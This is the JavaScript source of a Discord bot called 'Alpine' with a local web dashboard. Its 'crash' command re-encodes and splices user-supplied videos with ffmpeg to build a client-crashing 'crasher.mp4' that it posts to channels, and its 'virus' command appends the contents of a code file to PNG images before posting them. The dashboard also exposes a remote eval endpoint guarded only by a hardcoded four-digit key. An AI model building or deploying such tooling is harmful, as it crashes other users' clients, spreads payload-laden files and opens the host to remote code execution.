const discord = require("discord.js")
const { exec, spawn } = require("child_process");
const request = require("request");
const fs = require("fs")
const client = new discord.Client();
const express = require("express");
const bodyParser = require('body-parser')
const url = require('url');
const querystring = require('querystring');
const sharp = require('sharp')

/* Config */


var apikey = "7831"
var prefix = "-"


/* End Config */

function redraw() {
    console.clear();
    console.log(" █████╗ ██╗     ██████╗ ██╗███╗   ██╗███████╗");
    console.log("██╔══██╗██║     ██╔══██╗██║████╗  ██║██╔════╝");
    console.log("███████║██║     ██████╔╝██║██╔██╗ ██║█████╗ ");
    console.log("██╔══██║██║     ██╔═══╝ ██║██║╚██╗██║██╔══╝  ");
    console.log("██║  ██║███████╗██║     ██║██║ ╚████║███████╗");
    console.log("╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝");
    console.log("Alpine Bot dashboard now running. Dashboard: https://localhost:4100\nYour key for the dashboard is: "+apikey)
    console.log("Dashboard Endpoints:\nhttp://localhost:4100/panel?key="+apikey+"\nhttp://localhost:4100/send?key="+apikey+"&m=hello%20world&id=channel\nhttp://localhost:4100/auth?key="+apikey+"\nhttp://localhost:4100/eval?key="+apikey+"&code=console.log('a')\nhttp://localhost:4100/guilds?key="+apikey+"\nhttp://localhost:4100/guilds?key="+apikey+"&inv=serverid\n\nMade by Agent#9895")
    return("drew console")
}
function clean(text) {
    if (typeof(text) === "string")
      return text.replace(/`/g, "`" + String.fromCharCode(8203)).replace(/@/g, "@" + String.fromCharCode(8203));
    else
        return text;
}

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json())



app.get('/auth', function(request, res) {
    var a = request.query
    var key = request.query.key
    console.log(key)
    if (key == apikey) {
        res.writeHead(200)
        res.end(key)
    } else {
        res.writeHead(200)
        res.end("false")
    }
})
app.get("/guilds", function(req, res) {
    if (req.query.key) {
        if (req.query.key == apikey) {

            if (req.query.inv) {
                var guild = client.guilds.cache.get(req.query.inv)
                let invitechannels = guild.channels.cache.filter(c => c.permissionsFor(guild.me).has('CREATE_INSTANT_INVITE'))
                if (!invitechannels) {
                    return res.end('No Channels found with permissions to create Invite in!')
                }

                invitechannels.random().createInvite()
                    .then(invite => res.end('Found Invite:\n' + invite.code))
            } else {
                const Guilds = client.guilds.cache.map(guild => guild.id);
                var str = Guilds.join(' ');

                res.end(str)
            }

        } else {
            res.end("key invalid")
        }
    } else {
        res.end("key needed.")
    }


})
app.get("/", function(req, res) {
    res.sendFile('views/test.html', {
        root: __dirname
    })
})
app.get("/panel", function(req, res) {
    var key = req.query.key
    if (!key == apikey) {
        res.writeHead(404)
        res.end("no, you need a key dumbass")
    } else if (key == apikey) {
        res.sendFile('views/panel.html', {
            root: __dirname
        })

    }
})
app.get("/views/bs.css", function(req, res) {
    res.sendFile('views/bs.css', {
        root: __dirname
    })
})
app.get("/views/img/ico.png", function(req, res) {
    res.sendFile('views/img/ico.png', {
        root: __dirname
    })
})
app.get("/views/signin.css", function(req, res) {
    res.sendFile('views/signin.css', {
        root: __dirname
    })
})
var ver = "b1.2"
app.get("/send", function(req, res) {
    if (!req.query.key) {
        res.sendFile('views/19.mp4', {
            root: __dirname
        })

    }
    var key = req.query.key;
    var c = req.query.id;
    var m = req.query.m;
    if (key == apikey) {
        if (c) {
            if (!m) {
                var m = ""
            }
            client.channels.cache.get(`${c}`).send(m);
            res.writeHead(200)
            res.end("sent message " + m + " to channel.")
        } else {
            res.writeHead(200)
            res.end("id needed xd")
        }
    } else {
        res.sendFile('views/19.mp4', {
            root: __dirname
        })

    }
})
app.get("/eval", function(req, res) {
    if (!req.query.key) {
        console.log(req.query.key)
        res.sendFile('views/19.mp4', {
            root: __dirname
        })

        return;
    }
    var key = req.query.key
    if (key == apikey) {
        var code = req.query.code
        try {
            let evaled = eval(code);

            if (typeof evaled !== "string")
                evaled = require("util").inspect(evaled);
            //res.writeHead(200)

            res.end(clean(evaled));
        } catch (err) {
           // res.writeHead(200)

            res.end(`ERROR: ${clean(err)}`);
        }

    } else {
        res.sendFile('views/19.mp4', {
            root: __dirname
        })

    }
})
app.listen(4100, function(err) {
    if (err) console.log(err);
    console.log("Dashboard Started! http://localhost:4100");
});


async function download(url, name){
    fs.unlink('part2_new.mp4', function (err) {
        if (err) {console.log(err)};
        console.log('File deleted!');
    });
    fs.unlink('part1.mp4', function (err) {
        if (err) {console.log(err)};
        console.log('File deleted!');
    });
    fs.unlink('crasher.mp4', function (err) {
        if (err) {console.log(err)};
        console.log('File deleted!');
    });
    fs.unlink('1.png', function (err) {
        if (err) {console.log(err)};
        console.log('File deleted!');
    });
    fs.unlink('f.png', function (err) {
        if (err) {console.log(err)};
        console.log('File deleted!');
    });
    request.get(url)
        .on('error', console.error)
        .pipe(fs.createWriteStream(name));
}
function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
  });
} 

async function crashv() {  
    await sleep(5)
    const a = spawn("ffmpeg", ["-i", "part2.mp4", "-pix_fmt", "yuv444p", "part2_new.mp4"])
    a.stdout.on('data', (data) => {
        console.log(data)
    })
    a.stderr.on('data', (data) => {
        console.log(data)
    })
    a.on('close', (code) => {
        exec("ffmpeg -f concat -i jjj.txt -codec copy crasher.mp4", (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
            return;
        });
    })
    return (true)
};




client.on("ready", async () => {
  console.log("Logged into "+client.user.tag)
})

redraw();
// how to send embed json yep ok yeah ok : m.channel.send({embed: jsonthing})
client.on("message", async m => {
    if (m.content.startsWith(prefix)) {
    console.log(m.guild.name+" "+m.channel.id)

    
    if (m.content.substr(0,1) == prefix) {
        var args = m.content.split(" ").slice(1);
      if (m.content.substr(1,4)=="help") {
      var help = {
            "title": "Alpine - Help Section",
            "url": "https://cdn.discordapp.com/attachments/790385596774219796/805191977569222676/unknown.png",
            "color": 11364309,
            "fields": [
              {
                "name": "Config:",
                "value": `Prefix: ${prefix}\nVersion: ${ver}`
              },
              {
                "name": "Commands:",
                "value": "```html\n- crash <video>\n- virus <img>\n- ban <user>```"
              }
            ],
            "author": {
              "name": `${client.user.tag}`,
              "url": "https://pornhub.com"
            },
            "footer": {
              "text": "made by Agent",
              "icon_url": "https://cdn.discordapp.com/attachments/790385596774219796/805191977569222676/unknown.png"
            }
      }
        
      
      console.log("Command Found: help")
     var a = await m.channel.send({embed: help})

    }

    if (m.content.substr(1,3)=="ban") {
        if (m.member.hasPermission("BAN_MEMBERS")) {

            console.log('ban')
            
            let user = m.mentions.users.first();
   
            user.send("get banned L")
            
            m.mentions.members.first().ban().then((member) => {
                 m.channel.send(":wave: " + member.displayName + " has been successfully banned :point_right: ");
                  m.channel.send("https://media.discordapp.net/attachments/751516857244057651/799667845922684938/image0-17-1.gif")
             }).catch(() => {
                 m.channel.send("Access Denied");
        });
    }
   }
   if (m.content.substr(1,5)=="crash") {
    old = m
    m.delete()
    m = old
    if (!m.attachments.first()) {
      console.log(m.content.substr)
      await(download(m.content.substr(6,m.content.length), 'part1.mp4'))
    }else{
    await download(m.attachments.first().url,'part1.mp4');
    }
    crashv();
     await sleep(9000)
     old.channel.send({files:["crasher.mp4"]})
   redraw()
   }
   if (m.content.substr(1,5)=="virus") {
    m.reply("creating virus image x3")
    if (!m.attachments.first()) {
        console.log(m.content.substr)
        await(download(m.content.substr(6,m.content.length), 'f.png'))
      }else{
      await download(m.attachments.first().url,'f.png');
      }
      await sleep(6000)
      sharp('f.png')
      .resize(225, 258)
      .toFile('1.png', (err, info) => { 
          if (err) {console.log(err)} 
          const amount = 1
          fs.readFile("code.txt", function(err,data) {
          if (err){throw err;}
      
          for (i = 1; i <= amount; i++) {
              fs.appendFile(i+'.png', "\n"+data, function (err) {
              if (err) throw err;
              console.log('Saved!');
              m.channel.send({files: ["1.png"]})
          });
        }
        })
       });

   } // end virus cmd
 }}


})



client.login("token")
